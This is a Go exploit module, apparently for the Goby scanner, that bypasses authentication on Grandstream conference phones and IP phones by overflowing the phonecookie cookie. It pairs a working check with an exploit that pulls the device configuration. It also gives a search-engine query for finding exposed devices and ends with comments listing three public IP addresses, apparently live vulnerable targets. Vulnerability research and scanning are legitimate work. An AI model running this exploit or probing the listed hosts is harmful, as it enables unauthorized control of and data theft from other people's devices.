package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"git.gobies.org/goby/goscanner/goutils"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Grandstream GXX multiple product Authentication bypass",
    "Description": "<p>Grandstream GAC2500, etc. are the products of the American trend network (Grandstream). Grandstream GAC2500 is a business conference phone device based on Android platform. The Grandstream GXP2200 is an IP phone. The Grandstream GVC3202 is a full HD video conferencing device.</p><p>Because the developer does not properly handle the phonecookie parameter of the cookie, the phonecookie has a buffer overflow, and the authentication is bypassed by overwriting the data structure, resulting in the system can be arbitrarily modified and controlled.</p>",
    "Product": "Grandstream-GXX",
    "Homepage": "http://www.grandstream.com/",
    "DisclosureDate": "2022-06-03",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "body=\"zh_multiphone\" && body=\"zh_authfail\"",
    "GobyQuery": "body=\"zh_multiphone\" && body=\"zh_authfail\"",
    "Level": "3",
    "Impact": "<p>The attacker bypasses the system authentication by constructing a special URL address, thus causing the system to be in an extremely dangerous state.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage:</p><p><a href=\"http://www.grandstream.com/\">http://www.grandstream.com/</a></p>",
    "References": [
        "https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=23920"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Grandstream GXX 多款设备存在认证绕过漏洞",
            "Product": "Grandstream-GXX",
            "Description": "<p>Grandstream GAC2500等都是美国潮流网络（Grandstream）公司的产品。Grandstream GAC2500是一款基于Android平台的商务会议电话设备。Grandstream GXP2200是一款IP电话。Grandstream GVC3202是一款全高清视频会议设备。<br></p><p>由于开发者未对cookie的phonecookie参数进行正确处理，<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">phonecookie存在缓冲区溢出，通过覆盖数据结构而绕过身份认证，<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">导致系统可以被任意修改和控制。</span></span></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：</p><p><a href=\"http://www.grandstream.com/\">http://www.grandstream.com/</a></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，绕过系统认证，从而导致系统处于极度危险的状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Grandstream GXX multiple product Authentication bypass",
            "Product": "Grandstream-GXX",
            "Description": "<p>Grandstream GAC2500, etc. are the products of the American trend network (Grandstream). Grandstream GAC2500 is a business conference phone device based on Android platform. The Grandstream GXP2200 is an IP phone. The Grandstream GVC3202 is a full HD video conferencing device.</p><p>Because the developer does not properly handle the phonecookie parameter of the cookie, the phonecookie has a buffer overflow, and the authentication is bypassed by overwriting the data structure, resulting in the system can be arbitrarily modified and controlled.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage:</p><p><a href=\"http://www.grandstream.com/\">http://www.grandstream.com/</a></p>",
            "Impact": "<p>The attacker bypasses the system authentication by constructing a special URL address, thus causing the system to be in an extremely dangerous state.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10679"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/manager?action=xxxx"
			url := fmt.Sprintf("%s/%s",u.FixedHostInfo,uri)
			randStr := goutils.RandomHexString(93)

			if resp, err := httpclient.SimpleGet(url); err == nil {
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Header.Store("Cookie", fmt.Sprintf("phonecookie=\"%s\"",randStr))
				if resp1, err := httpclient.DoHttpRequest(u,cfg); err == nil {
					return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `Message=Authentication Required`) && resp1.StatusCode == 200 && strings.Contains(resp1.Utf8Html, `Message=Command Not Found`)
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/manager?action=get&var-0000=8&var-0001=82&var-0002=83&var-0003=269&var-0004=146&var-0005=147&var-0006=148&var-0007=9&var-0008=10&var-0009=11&var-0010=12&var-0011=13&var-0012=14&var-0013=15&var-0014=16&var-0015=17&var-0016=18&var-0017=19&var-0018=20&var-0019=21&var-0020=22&var-0021=23&var-0022=24&var-0023=25&var-0024=26&var-0025=27&var-0026=28&var-0027=92&var-0028=93&var-0029=94&var-0030=95&var-0031=5026&var-0032=5027&var-0033=5028&var-0034=5029&var-0035=1558&var-0036=1559&var-0037=1560&var-0038=51&var-0039=87&var-0040=1541&var-0041=7901&var-0042=7902&var-0043=7903&var-0044=http_proxy&var-0045=proxy_apply_all&var-0046=https_proxy&var-0047=ftp_proxy&var-0048=no_proxy"
			randStr := goutils.RandomHexString(93)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.Header.Store("Cookie", fmt.Sprintf("phonecookie=\"%s\"",randStr))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo,cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `Response=Success`) {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}

//http://108.56.146.254:8180
//http://82.54.196.191
//http://110.92.19.184:8085